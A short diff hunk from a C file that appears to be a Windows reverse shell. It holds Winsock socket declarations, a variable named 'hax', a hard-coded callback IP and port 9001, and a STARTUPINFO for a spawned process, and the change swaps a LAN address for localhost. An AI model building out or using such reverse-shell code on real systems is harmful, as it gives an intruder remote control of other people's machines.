@@ -7,7 +7,7 @@
 WSADATA wsaData;
 SOCKET Winsock;
 struct sockaddr_in hax; 
-char ip_addr[16] = "192.168.0.15"; 
+char ip_addr[16] = "127.0.0.1"; 
 char port[6] = "9001";            
 
 STARTUPINFO ini_processo;
